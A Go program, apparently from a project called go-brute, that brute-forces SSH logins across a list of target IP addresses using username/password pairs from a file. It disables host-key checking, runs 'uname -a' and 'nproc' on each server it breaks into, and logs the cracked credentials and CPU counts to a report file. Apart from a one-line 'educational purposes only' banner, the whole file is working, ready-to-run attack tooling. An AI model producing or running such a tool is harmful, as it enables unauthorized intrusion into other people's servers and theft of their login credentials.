package main

import (
	"bufio"
	"bytes"
	"fmt"
	"log"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	ipfile   string
	port     string
	ip       string
	threads  string
	timeouts string
	throttle bool
)

func init() {
	if len(os.Args) <= 4 {
		fmt.Println("[INFO] Syntax: ./brute [ Port ] [ Threads ] [ IP File ] [ Timeout ]")
		os.Exit(1)
	} else {
		ipfile = os.Args[3]
		timeouts = os.Args[4]
		threads = os.Args[2]
		port = os.Args[1]
	}
}

func main() {
	routinesCount, _ := strconv.Atoi(threads)
	runtime.GOMAXPROCS(routinesCount)

	var ips []string
	var combo [][]string
	var wg sync.WaitGroup

	lines, err := readLines(ipfile)
	if err != nil {
		log.Fatalf("readLines: %s", err)
	}

	for _, line := range lines {
		ips = append(ips, line)
	}
	lines2, err := readLines("pass")
	if err != nil {
		log.Fatalf("readLines: %s", err)
	}
	for _, line := range lines2 {
		s := strings.Split(line, " ")
		combo = append(combo, s)
	}

	//Licensing and warning
	fmt.Printf("\n\t\t\033- [31mWARNING\033[0m\n\033[36mThis binary is licensed under the Apache License 2.0\nThis binary is only intended for educational purposes only !\nYou can contribute to the project on https://github.com/yourfavDev/go-brute\n\n\033[0m")

	for i, _ := range combo {
		if len(combo[i]) < 2 {
			fmt.Printf("Mistyped line #%v ( %q )\n", i, lines2[i])
		} else {
			fmt.Printf("Attempting %v:%v on all target systems\n", combo[i][0], combo[i][1])
			for ix, _ := range ips {
				time.Sleep(1 * time.Millisecond)
				wg.Add(1)
				go tryHost(combo[i][0], ips[ix], combo[i][1], "uname -a", &wg)
				if throttle == false {
					throttle = true
					i, _ := strconv.Atoi(timeouts)
					time.Sleep(time.Duration(i) * time.Second)
				}
			}
		}
	}
	time.Sleep(30 * time.Second)
	os.Exit(0)
}
func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {

		return nil, err
	}

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	file.Close()
	return lines, scanner.Err()
}

func tryHost(user string, addr string, pass string, cmd string, wg *sync.WaitGroup) {
	i, _ := strconv.Atoi(timeouts)
	config := &ssh.ClientConfig{
		User:            user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		Timeout: time.Duration(i) * time.Second,
	}

	defer wg.Done()

	client, err := ssh.Dial("tcp", net.JoinHostPort(addr, port), config)
	if err != nil {
		throttle = false
		return
	} else {
		session, err := client.NewSession()
		if err != nil {
			throttle = false
			return
		}

		var b bytes.Buffer
		session.Stdout = &b
		err = session.Run(cmd)
		session.Close()

		if err != nil {
			throttle = false
			return
		}

		cmd1 := `nproc`

		session1, err := client.NewSession()

		if err != nil {
			throttle = false
			return
		}

		var b1 bytes.Buffer
		session1.Stdout = &b1
		session1.Run(cmd1)
		session1.Close()

		if err != nil {
			throttle = false
			return
		}

		client.Close()
		unamea := strings.Replace(b.String(), "\n", "", -1)
		cpus := strings.Replace(b1.String(), "\n", "", -1)
		if cpus == "" {
			cpus = "Invalid"
		}
		cp, _ := strconv.ParseInt(cpus, 10, 64)
		outs := "\nNetwork Details -> " + user + "@" + addr + ":" + port + "\nServer login password found -> " + pass + "\nOS Info -> " + unamea + "\nCPUs count -> " + cpus + "\n"
		if cp > 0 {
			f, err := os.OpenFile("vuln-report.txt",
				os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err != nil {
				log.Println(err)
			}

			if _, err := f.WriteString(outs); err != nil {
				log.Println(err)
			}
			f.Close()
			fmt.Printf("\nNetwork Details -> %v@%v:%v\nServer login password found -> %v\nOS Info -> %v\nCPUs count -> %v\n", user, addr, port, pass, unamea, cpus)
		}
	}

}
